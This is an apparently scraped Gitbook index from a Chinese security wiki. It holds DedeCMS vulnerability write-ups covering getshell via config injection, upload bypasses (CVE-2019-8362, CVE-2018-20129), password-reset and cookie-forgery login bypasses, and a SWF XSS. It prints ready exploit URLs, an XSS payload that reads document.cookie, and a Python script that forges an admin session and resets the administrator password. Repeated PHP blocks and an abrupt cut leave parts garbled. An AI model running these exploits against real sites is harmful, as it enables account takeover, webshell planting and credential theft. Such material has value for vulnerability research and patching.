preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$svar) ) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&$val) { if (is_array($val)) { foreach ($val as $_k=>$_v) { if($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$val) ) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) { if($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } function _RunMagicQuotes(&$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$svar) ) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&$val) { if (is_array($val)) { foreach ($val as $_k=>$_v) { if($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$val) ) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) { if($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } 可以看到，这里会将$refiles数组中的内容写入配置文件modifytmp.inc中。 dedecms对于输入是全局过滤的，在/common.inc.php中注册并过滤了外部提交的变量 function _RunMagicQuotes(&$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$svar) ) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&$val) { if (is_array($val)) { foreach ($val as $_k=>$_v) { if($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$val) ) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) { if($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } 上面的$refiles就是注册的外部变量，可见已经addlashes了而我们还是需要绕过fwrite($fp, \\'$files[\\'.$i.\\'] = \\\"\\'.$filename.\\'\\\";\\'.\\\"\\r\\n\\\"); 实现注入shell，首先需要注入就必须闭合双引号，在这里有个诡异的操作 $filename = substr($filename,3,strlen($filename)-3); 去掉了输入的前三个字符，这样就为我们写shell制造了机会，当我们输入\\\" 时经过addlashes会变成\\\\\"，再去掉前三个字符就只剩下双引号实现闭合。 此时写入shell后只要再找一个包含modifytmp.inc文件的文件就好了，全局搜索一下可以发现就在本文件/dede/sys_verifies.php 第二个 同样是写配置文件，位于/dede/sys_cache_up.php else if($step == 2) { include_once(DEDEINC.\"/enums.func.php\"); WriteEnumsCache(); //WriteAreaCache(); 已过期 ShowMsg(\"成功更新枚举缓存，准备更新调用缓存...\", \"sys_cache_up.php?dopost=ok&step=3&uparc=$uparc\"); exit(); } 跟进WriteEnumsCache() function WriteEnumsCache($egroup='') { global $dsql; $egroups = array(); if($egroup=='') { $dsql->SetQuery(\"SELECT egroup FROM `#@__sys_enum` GROUP BY egroup \"); } else { $dsql->SetQuery(\"SELECT egroup FROM `#@__sys_enum` WHERE egroup='$egroup' GROUP BY egroup \"); } $dsql->Execute('enum'); while($nrow = $dsql->GetArray('enum')) { $egroups[] = $nrow['egroup']; } foreach($egroups as $egroup) { $cachefile = DEDEDATA.'/enums/'.$egroup.'.php'; $fp = fopen($cachefile,'w'); fwrite($fp,'SetQuery(\"SELECT ename,evalue,issign FROM `#@__sys_enum` WHERE egroup='$egroup' ORDER BY disorder ASC, evalue ASC \"); $dsql->Execute('enum'); $issign = -1; $tenum = false; //三级联动标识 while($nrow = $dsql->GetArray('enum')) { fwrite($fp,\"\\$em_{$egroup}s['{$nrow['evalue']}'] = '{$nrow['ename']}';\\r\\n\"); if($issign==-1) $issign = $nrow['issign']; if($nrow['issign']==2) $tenum = true; } if ($tenum) $dsql->ExecuteNoneQuery(\"UPDATE `#@__stepselect` SET `issign`=2 WHERE egroup='$egroup'; \"); fwrite($fp,'?'.'>'); fclose($fp); if(empty($issign)) WriteEnumsJs($egroup); } return '成功更新所有枚举缓存！'; } 可以看到，直接从数据库中读取并写入php文件中，从数据库中取出后并没有经过过滤。 将shell写进数据库中 http://0-sec.org/dede/stepselect_main.php?action=addenum_save&ename=123&egroup=;phpinfo();//&islogin=1 DedecmsV5.7后台的两处getshell/media/rId27.png) 复现 因为包含是在同一个文件，所以直接输入 http://0-sec.org/dede/sys_verifies.php?action=getfiles&refiles[]=123&refiles[]=\\%22;phpinfo();die();// DedecmsV5.7后台的两处getshell/media/rId29.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:09 "},"Web安全/Dedecms/（CVE-2019-8362）Dedecms v5.7 sp2 后台文件上传 getshell/（CVE-2019-8362）Dedecms v5.7 sp2 后台文件上传 getshell.html":{"url":"Web安全/Dedecms/（CVE-2019-8362）Dedecms v5.7 sp2 后台文件上传 getshell/（CVE-2019-8362）Dedecms v5.7 sp2 后台文件上传 getshell.html","title":"（CVE-2019-8362）Dedecms v5.7 sp2 后台文件上传 getshell","keywords":"","body":"（CVE-2019-8362）Dedecms v5.7 sp2 后台文件上传 getshell 一、漏洞简介 上传zip文件解压缩对于文件名过滤不周，导致getshell 二、漏洞影响 三、复现过程 代码分析 /dede/album_add.php 175行验证后缀 $fm->GetMatchFiles($tmpzipdir,\\\"jpg|png|gif\\\",$imgs); 进入函数： function GetMatchFiles($indir, $fileexp, &$filearr) { $dh = dir($indir); while($filename = $dh->read()) { $truefile = $indir.'/'.$filename; if($filename == \".\" || $filename == \"..\") { continue; } else if(is_dir($truefile)) { $this->GetMatchFiles($truefile, $fileexp, $filearr); } else if(preg_match(\"/\\.(\".$fileexp.\")/i\",$filename)) { $filearr[] = $truefile; } } $dh->close(); } 可以确定preg_match(\\\"/.(\\\".$fileexp.\\\")/i\\\",$filename)只是判断了文件名中是否存在.jpg、.png、.gif中的一个，只要构造1.jpg.php就可以绕过。 复现 1、首先构造一个文件名为1.jpg.php的文件，内容为 2、将该文件进行压缩 3、在常用操作-文件式管理器处上传压缩文件到soft目录下 Dedecmsv5.7sp2后台文件上传getshell/media/rId29.png) Dedecmsv5.7sp2后台文件上传getshell/media/rId30.png) 4、访问dede/album_add.php，选择从 从ZIP压缩包中解压图片 Dedecmsv5.7sp2后台文件上传getshell/media/rId32.png) 5、发布预览 Dedecmsv5.7sp2后台文件上传getshell/media/rId34.png) Dedecmsv5.7sp2后台文件上传getshell/media/rId35.png) Dedecmsv5.7sp2后台文件上传getshell/media/rId36.png) Dedecmsv5.7sp2后台文件上传getshell/media/rId37.gif) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:10 "},"Web安全/Dedecms/【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞/【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞.html":{"url":"Web安全/Dedecms/【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞/【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞.html","title":"【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞","keywords":"","body":"（CVE-2018-20129）Dedecms前台文件上传漏洞 一、漏洞简介 管理员用户前台可以绕过限制上传shell 二、漏洞影响 三、复现过程 代码分析 漏洞在于用户发布文章上传图片处。处理文件在/include/dialog/select_images_post.php 而上传文件存在全局过滤/include/uploadsafe.inc.php #/include/uploadsafe.inc.php $cfg_not_allowall = \"php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml\"; if(!empty(${$_key.'_name'}) && (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) ) { if(!defined('DEDEADMIN')) { exit('Not Admin Upload filetype not allow !'); } } $imtypes = array ( \"image/pjpeg\", \"image/jpeg\", \"image/gif\", \"image/png\", \"image/xpng\", \"image/wbmp\", \"image/bmp\" ); if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes)) { $image_dd = @getimagesize($$_key); if (!is_array($image_dd)) { exit('Upload filetype not allow !'); } } 可以看到名字中不得有上述字符，且限制了content-type。按道理说直接限制不得存在的字符，似乎没有问题了，可在发布文章文件上传的处理文件select_images_post.php中存在如下代码： $imgfile_name = trim(preg_replace(\"#[ \\r\\n\\t\\*\\%\\\\\\/\\?>再次过滤了图片名，并且再次判断如上三种文件类型是否存在其中。这么一次过滤，直接粗暴的将一些特殊字符替换为空，那么我们就可以通过特殊字符绕过上面的全局文件名不能包含php字符的限制，比如文件名为1.jpg.p*hp 复现 登录并进入member/article_add.php发布文章，选择下面的富文本编辑器插入图片 Dedecms前台文件上传漏洞/media/rId26.png) 选择好shell并上传抓包 Dedecms前台文件上传漏洞/media/rId27.png) Dedecms前台文件上传漏洞/media/rId28.png) 向如上分析修改文件名与content-type，即可返回shell地址 Dedecms前台文件上传漏洞/media/rId29.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:03 "},"Web安全/Dedecms/【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改/【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改.html":{"url":"Web安全/Dedecms/【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改/【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改.html","title":"【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改","keywords":"","body":"（SSV-97074）DeDecms 前台任意用户密码修改 一、漏洞简介 无CVE， SSV-97074，提交时间：20180110 在用户密码重置功能处，php存在弱类型比较，导致如果用户没有设置密保问题的情况下可以绕过验证密保问题，直接修改密码(管理员账户默认不设置密保问题)。值得注意的是修改的密码是member表中的密码，即使修改了管理员密码也是member表中的管理员密码，仍是无法进入管理 二、漏洞影响 三、复现过程 代码分析 php弱类型比较问题很常见，在不同类型比较时，如果使用的是==，php会将其中一个数据进行强制转换为另一个，比如'123a'就会被强制转换成123。这样就出现了弱类型比较问题，当然如果使用===判断比较就不会出现问题了。常见比较如下 '' == 0 == false '123' == 123 //'123'强制转换为123 'abc' == 0　 //intval('abc')==0 '123a' == 123 //intval('123a')==123 '0x01' == 1 //被识别为十六进制 '0e123456789' == '0e987654321'　　//被识别为科学计数法 [false] == [0] == [NULL] == [''] NULL == false == 0 true == 1 dedecms的/member/resetpassword.php就是用来处理用户密码重置的问题，问题出在75行开始处理验证密保问题处。 else if($dopost == \"safequestion\") { $mid = preg_replace(\"#[^0-9]#\", \"\", $id); $sql = \"SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'\"; $row = $db->GetOne($sql); if(empty($safequestion)) $safequestion = ''; if(empty($safeanswer)) $safeanswer = ''; if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer) { sn($mid, $row['userid'], $row['email'], 'N'); exit(); } else { ShowMsg(\"对不起，您的安全问题或答案回答错误\",\"-1\"); exit(); } } 可以看到，这段代码先是从数据库取出相关用户的密保问题及密保答案，在对用户输入做了一些处理后，进行了关键性的判断if($row[\\'safequestion\\'] == $safequestion && $row[\\'safeanswer\\'] == $safeanswer) ，就在这里用了弱类型判断==。 首先我们知道，如果没有设置密保的话safequestion从数据库取出默认为'0'，safeanswer为空。根据empty函数特性，'0'会被判断为空，会进入重新将$safequestion赋值为''。而\\'0\\' != \\'\\' ，所以我们需要一个输入即不使empty为空，且弱类型等于'0'的字符串。\\'00\\'、\\'000\\'、\\'0.0\\'以上这些都是可以的。 接下来safeanswer既然本来就为空，那么不输入正好也就相等了。跟踪sn函数 function sn($mid,$userid,$mailto, $send = 'Y') { global $db; $tptim= (60*10); $dtime = time(); $sql = \"SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'\"; $row = $db->GetOne($sql); if(!is_array($row)) { //发送新邮件； newmail($mid,$userid,$mailto,'INSERT',$send); } //10分钟后可以再次发送新验证码； elseif($dtime - $tptim > $row['mailtime']) { newmail($mid,$userid,$mailto,'UPDATE',$send); } //重新发送新的验证码确认邮件； else { return ShowMsg('对不起，请10分钟后再重新申请', 'login.php'); } } 跟踪newmail function newmail($mid, $userid, $mailto, $type, $send) { global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl; $mailtime = time(); $randval = random(8); $mailtitle = $cfg_webname.\":密码修改\"; $mailto = $mailto; $headers = \"From: \".$cfg_adminemail.\"\\r\\nReply-To: $cfg_adminemail\"; $mailbody = \"亲爱的\".$userid.\"：\\r\\n您好！感谢您使用\".$cfg_webname.\"网。\\r\\n\".$cfg_webname.\"应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\\r\\n本次临时登陆密码为：\".$randval.\" 请于三天内登陆下面网址确认修改。\\r\\n\".$cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd&id=\".$mid; if($type == 'INSERT') { $key = md5($randval); $sql = \"INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid', '$key', '$mailtime');\"; if($db->ExecuteNoneQuery($sql)) { if($send == 'Y') { sendmail($mailto,$mailtitle,$mailbody,$headers); return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000'); } else if ($send == 'N') { return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd&id=\".$mid.\"&key=\".$randval); } } else { return ShowMsg('对不起修改失败，请联系管理员', 'login.php'); } } 可见在sn函数中将send参数设置了'N'，其实就是生成了暂时密码并插入了数据库中，并进行跳转： else if ($send == 'N') { return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd&id=\".$mid.\"&key=\".$randval); } 复现 在找回密码处，点击通过安全问题取回。 DeDecms前台任意用户密码修改/media/rId26.png) 填写信息并抓包，修改id和userid为想要重置密码的对象，再加上以上分析内容，发包即可得到修改密码url DeDecms前台任意用户密码修改/media/rId27.png) 进入该url，修改密码。 DeDecms前台任意用户密码修改/media/rId28.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:05 "},"Web安全/Dedecms/【开启会员注册】（SSV-97087）DeDecms 任意用户登录/【开启会员注册】（SSV-97087）DeDecms 任意用户登录.html":{"url":"Web安全/Dedecms/【开启会员注册】（SSV-97087）DeDecms 任意用户登录/【开启会员注册】（SSV-97087）DeDecms 任意用户登录.html","title":"【开启会员注册】（SSV-97087）DeDecms 任意用户登录","keywords":"","body":"（SSV-97087）DeDecms 任意用户登录 一、漏洞简介 漏洞编号：SSV-97087，提交时间：20180118 dedecms的会员模块的身份认证使用的是客户端session，在Cookie中写入用户ID并且附上ID__ckMd5，用做签名。主页存在逻辑漏洞，导致可以返回指定uid的ID的Md5散列值。原理上可以伪造任意用户登录。 二、漏洞影响 三、复现过程 代码分析 在/member/index.php中会接收uid和action参数。uid为用户名，进入index.php后会验证Cookie中的用户ID与uid(用户名)并确定用户权限。 if($action == '') { include_once(DEDEINC.\"/channelunit.func.php\"); $dpl = new DedeTemplate(); $tplfile = DEDEMEMBER.\"/space/{$_vars['spacestyle']}/index.htm\"; //更新最近访客记录及站点统计记录 $vtime = time(); $last_vtime = GetCookie('last_vtime'); $last_vid = GetCookie('last_vid'); if(empty($last_vtime)) { $last_vtime = 0; } if($vtime - $last_vtime > 3600 || !preg_match('#,'.$uid.',#i', ','.$last_vid.',')) { if($last_vid!='') { $last_vids = explode(',',$last_vid); $i = 0; $last_vid = $uid; foreach($last_vids as $lsid) { if($i>10) { break; } else if($lsid != $uid) { $i++; $last_vid .= ','.$last_vid; } } } else { $last_vid = $uid; } PutCookie('last_vtime', $vtime, 3600*24, '/'); PutCookie('last_vid', $last_vid, 3600*24, '/'); 我们可以看到当uid存在值时就会进入我们现在的代码中，当cookie中的last_vid中不存在值为空时，就会将uid值赋予过去，$last_vid = $uid;，然后PutCookie。 那么这么说，我们控制了$uid就相当于可以返回任意值经过服务器处理的md5值。 而在接下来会验证用户是否登录。 现在我们来看看，dedecms会员认证系统是怎么实现的：/include/memberlogin.class.php //php5构造函数 function __construct($kptime = -1, $cache=FALSE) { global $dsql; if($kptime==-1){ $this->M_KeepTime = 3600 * 24 * 7; }else{ $this->M_KeepTime = $kptime; } $formcache = FALSE; $this->M_ID = $this->GetNum(GetCookie(\"DedeUserID\")); $this->M_LoginTime = GetCookie(\"DedeLoginTime\"); $this->fields = array(); $this->isAdmin = FALSE; if(empty($this->M_ID)) { $this->ResetUser(); }else{ $this->M_ID = intval($this->M_ID); if ($cache) { $this->fields = GetCache($this->memberCache, $this->M_ID); if( empty($this->fields) ) { $this->fields = $dsql->GetOne(\"Select * From `#@__member` where mid='{$this->M_ID}' \"); } else { $formcache = TRUE; } } else { $this->fields = $dsql->GetOne(\"Select * From `#@__member` where mid='{$this->M_ID}' \"); } if(is_array($this->fields)){ #api{{ if(defined('UC_API') && @include_once DEDEROOT.'/uc_client/client.php') { if($data = uc_get_user($this->fields['userid'])) { if(uc_check_avatar($data[0]) && !strstr($this->fields['face'],UC_API)) { $this->fields['face'] = UC_API.'/avatar.php?uid='.$data[0].'&size=middle'; $dsql->ExecuteNoneQuery(\"UPDATE `#@__member` SET `face`='\".$this->fields['face'].\"' WHERE `mid`='{$this->M_ID}'\"); } } } #/aip}} //间隔一小时更新一次用户登录时间 if(time() - $this->M_LoginTime > 3600) { $dsql->ExecuteNoneQuery(\"update `#@__member` set logintime='\".time().\"',loginip='\".GetIP().\"' where mid='\".$this->fields['mid'].\"';\"); PutCookie(\"DedeLoginTime\",time(),$this->M_KeepTime); } $this->M_LoginID = $this->fields['userid']; $this->M_MbType = $this->fields['mtype']; $this->M_Money = $this->fields['money']; $this->M_UserName = FormatUsername($this->fields['uname']); $this->M_Scores = $this->fields['scores']; $this->M_Face = $this->fields['face']; $this->M_Rank = $this->fields['rank']; $this->M_Spacesta = $this->fields['spacesta']; $sql = \"Select titles From #@__scores where integralfields['scores']} order by integral desc\"; $scrow = $dsql->GetOne($sql); $this->fields['honor'] = $scrow['titles']; $this->M_Honor = $this->fields['honor']; if($this->fields['matt']==10) $this->isAdmin = TRUE; $this->M_UpTime = $this->fields['uptime']; $this->M_ExpTime = $this->fields['exptime']; $this->M_JoinTime = MyDate('Y-m-d',$this->fields['jointime']); if($this->M_Rank>10 && $this->M_UpTime>0){ $this->M_HasDay = $this->Judgemember(); } if( !$formcache ) { SetCache($this->memberCache, $this->M_ID, $this->fields, 1800); } }else{ $this->ResetUser(); } } } $this->M_ID等于Cookie中的DedUserID，我们继续看看GetCookie函数 if ( ! function_exists('GetCookie')) { function GetCookie($key) { global $cfg_cookie_encode; if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'__ckMd5']) ) { return ''; } else { if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16)) { return ''; } else { return $_COOKIE[$key]; } } } } 它不但读了cookie还验证了md5值。 这样，由于index.php中我们可以控制返回一个输入值和这个输入值经过服务器处理后的md5值。那么如果我们伪造DedUserID和它对应的MD5就行了。 最后一个问题，因为我们上面是通过用户名伪造ID的，用户名为字符串而ID为整数，但好在在构造用户类中将M_ID intval了一下$this->M_ID = intval($this->M_ID); 那么这么说，如果我们想伪造ID为1的用户的Md5，我们只要在上面设置uid(用户名)为'000001'即可。 复现 1、先从member/index.php中获取伪造的DedeUserID和它对于的md5 2、使用它登录 访问member/index.php?uid=0000001并抓包(注意cookie中last_vid值应该为空)。 DeDecms任意用户登录/media/rId28.png) 可以看到已经获取到了，拿去当做DeDeUserID DeDecms任意用户登录/media/rId29.png) 可以看到，登陆了admin用户。 python脚本 # coding=utf-8 import requests import re if __name__ == \"__main__\": dede_host = \"http://127.0.0.1/\" oldpwd = '123456' newpwd = \"cnvdcnvd\" s = requests.Session() if '系统关闭了会员功能' in requests.get(dede_host + 'member/reg_new.php').content: exit('The system has closed the member function .Can not attack !!!') else: print \"The system opened the membership function, I wish you good luck !!\" headers = {\"Referer\": dede_host + \"member/reg_new.php\"} rs = s.get(dede_host + 'include/vdimgck.php').content file = open('1.jpg', \"wb\") file.write(rs) file.close() vdcode = raw_input(\"Please enter the registration verification code : \") userid = '0000001' uname = '0000001' userpwd = '123456' headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0)\", \"Content-Type\": \"application/x-www-form-urlencoded\"} data = \"dopost=regbase&step=1&mtype=%E4%B8%AA%E4%BA%BA&mtype=%E4%B8%AA%E4%BA%BA&userid={userid}&uname={uname}&userpwd={userpwd}&userpwdok={userpwd}&email=0000001%400000001.com&safequestion=0&safeanswer=&sex=%E7%94%B7&vdcode={vdcode}&agree=\".format( userid=userid, uname=uname, userpwd=userpwd, vdcode=vdcode) rs = s.post(dede_host + '/member/reg_new.php', data=data, headers=headers) if \"验证码错误\" in rs.content: exit(\"Verification code error, account registration failed\") elif '注册成功' in rs.content: print 'registration success !!' rs = s.get(dede_host + \"/member/index.php?uid={userid}\".format(userid=userid)) if \"资料尚未通过审核\" in rs.content: exit(\"User information has not been approved !!!\") # 会员使用权限开通状态(-10 邮件验证 -1 手工审核, 0 没限制)： searchObj = re.search(r'last_vid__ckMd5=(.*?);', rs.headers['Set-Cookie'], re.M | re.I) last_vid__ckMd5 = searchObj.group(1) s.cookies['DedeUserID'] = userid s.cookies['DedeUserID__ckMd5'] = last_vid__ckMd5 rs = s.get(dede_host + \"/member/index.php\") if \"class=\\\"userName\\\">admin\" in rs.text: print \"Administrator login successful !!\" headers = {\"Referer\": dede_host + \"member/edit_baseinfo.php\"} rs = s.get(dede_host + 'include/vdimgck.php').content file = open('2.jpg', \"wb\") file.write(rs) file.close() vdcode = raw_input(\"Please enter the verification code : \") data = {\"dopost\": \"save\", \"uname\": \"admin\", \"oldpwd\": oldpwd, \"userpwd\": newpwd, \"userpwdok\": newpwd, \"safequestion\": \"0\", \"newsafequestion\": \"0\", \"sex\": \"男\", \"email\": \"[email protected]/* */\", \"vdcode\": vdcode} rs = s.post(dede_host + '/member/edit_baseinfo.php', data=data) if \"成功更新你的基本资料\" in rs.content: print \"Administrator password modified successfully !!\" print \"The new administrator password is : \" + newpwd else: print \"attack fail\" Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:06 "},"Web安全/Dedecms/Dedecms swf文件反射型xss/Dedecms swf文件反射型xss.html":{"url":"Web安全/Dedecms/Dedecms swf文件反射型xss/Dedecms swf文件反射型xss.html","title":"Dedecms swf文件反射型xss","keywords":"","body":"Dedecms swf文件反射型xss 一、漏洞简介 DedeCMS 5.7 /images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。 二、漏洞影响 三、复现过程 代码分析 详细说明： Location: /uploads/images/swfupload/swfupload.swf 漏洞文件为：http://www.dedecms.com/images/swfupload/swfupload.swf 这个flash文件存在漏洞，此文件漏洞可参考:https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/ 复现 /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22ian最帅%22%29}}// /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}// Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:57 "},"Web安全/Dedecms/DedeCMS v5.7 SP2_任意修改前台用户密码/DedeCMS v5.7 SP2_任意修改前台用户密码.html":{"url":"Web安全/Dedecms/DedeCMS v5.7 SP2_任意修改前台用户密码/DedeCMS v5.7 SP2_任意修改前台用户密码.html","title":"DedeCMS v5.7 SP2_任意修改前台用户密码","keywords":"","body":"DedeCMS v5.7 SP2_任意修改前台用户密码 漏洞描述 dedecms v5.7可以在前台进行任意修改前台用户密码 漏洞影响 DedeCMS v5.7 SP2 漏洞分析 漏洞文件：/member/resetpasswordd.php 漏洞分析：下面我们一步一步对整个密码重置的过程进行分析 在resetpasswordd.php文件的开头处首先包含进行了一些配置文件以及功能函数文件，之后接受了一个id变量，用来查询用户： 之后检查dopost是否为空，如果为空则重定向到密码重置模板页面，如果不为空这进行匹配，当dopost为getpwd则对用户输入的验证码、邮箱、用户名的合法性进行校验： 在这里会首先判断找回密码的方式，这里一共提供了两种： 1、邮件方式：首先会检测邮件服务是否开启如果开启则发送邮件，否则给出提示信息 2、安全问题：检测是否有设置安全问题，如果有则重定向到密码重置的第三步，否则给出提示 该漏洞的触发点在于以安全问题找回密码时的不安全性逻辑设计所导致的，所以我们根据流程进入到以\"安全问题\"找回密码的逻辑代码中继续分析，可以看到这里会根据之前传递进来的用户id作为参数从数据库查询对应的safequestion、safeanswer，之后于用户提供的safequestion以及safeanswer进行判断，但是可以注意到的是此处使用的是————\"==\"做判断： 当用户没有设置安全问题时，数据库里存储的safequestion默认为\"0\"，safeanswer默认为'null': 通过php弱类型的转换'0.0' == '0'可以成立，当然在这里直接传0是不行的，因为前面有一个empty的判断，当然你也可以利用十六进制比如:0x0 接下来跟进sn函数，在该函数中会首先进行初始化赋值操作(此处的send为上面传递进来的'N')，之后跟进传递的id进行一次sql查询，之后进行判断，在这里我们直接根据newmail查看发送邮件的函数具体实现： 可以看到当send为'N'时，直接在前端页面返回了验证码(而我们这里刚好默认就是N，见前文)又因为用户id是我们可以控制的safequestion(默认情况)下可以绕过，那么也就达成了修改前台任意用户密码的效果！ 漏洞利用 因为这里的模块属于会员模块，包含了member.login.class.php，需要登录才能操作，所以我先注册一个用户，担任攻击者，再注册另外一个用户担任目标： 攻击者：test\\2\\test(用户\\ID\\密码) 攻击目标：test1\\3\\hacker(用户\\ID\\密码) Step1: 登陆test用户 此时系统用户的id分配如下所示： Step2：发送以下请求url获取key值 http://192.168.174.159:88/DedeCms/member/resetpassword.php?dopost=safequestion&safequestion=0.0&id=4 Step3：修改请求页URL(下面的key来自上面的请求结果) http://127.0.0.1/dedecms/member/resetpassword.php?dopost=getpasswd&id=4&key=anQZXeG5 Step4：修改用户test1的密码为hacker Step5: 用修改之后的密码登陆进行验证 成功登陆： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:58 "},"Web安全/Dedecms/Dedecms找后台/Dedecms找后台.html":{"url":"Web安全/Dedecms/Dedecms找后台/Dedecms找后台.html","title":"Dedecms找后台","keywords":"","body":"Dedecms找后台 一、漏洞简介 仅针对windows系统 二、漏洞影响 三、复现过程 代码分析 进入正题 首先看核心文件common.inc.php 大概148行左右 if($_FILES) { require_once(DEDEINC.'/uploadsafe.inc.php'); } uploadsafe.inc.php if( preg_match('#^(cfg_|GLOBALS)#', $_key) ) { exit('Request var not allow for uploadsafe!'); } $$_key = $_FILES[$_key]['tmp_name']; //获取temp_name ${$_key.'_name'} = $_FILES[$_key]['name']; ${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\\./]#i', '', $_FILES[$_key]['type']); ${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']); if(!empty(${$_key.'_name'}) && (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) ) { if(!defined('DEDEADMIN')) { exit('Not Admin Upload filetype not allow !'); } } if(empty(${$_key.'_size'})) { ${$_key.'_size'} = @filesize($$_key); } $imtypes = array ( \"image/pjpeg\", \"image/jpeg\", \"image/gif\", \"image/png\", \"image/xpng\", \"image/wbmp\", \"image/bmp\" ); if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes)) { $image_dd = @getimagesize($$_key); //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。 if (!is_array($image_dd)) { exit('Upload filetype not allow !'); } } ...... 注意$$_key这一句，变量$key取自于$_FILE，由于$FILE可控自然$key也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现cfg|GLOBALS。(但是应该还可以覆盖其他变量此处感觉还可以深挖) 本人出发点是找个可以利用\\ 但在这之前有个if(!defined(\\'DEDEADMIN\\'))的判断,这个很好绕过设置tmp_name为0或者1.jpg含. 就可以绕过。 最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。 当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow ! 举个例子 get: http://localhost/test.php?poc=./d复现 构造poc http://0-sec.org/tags.php post: 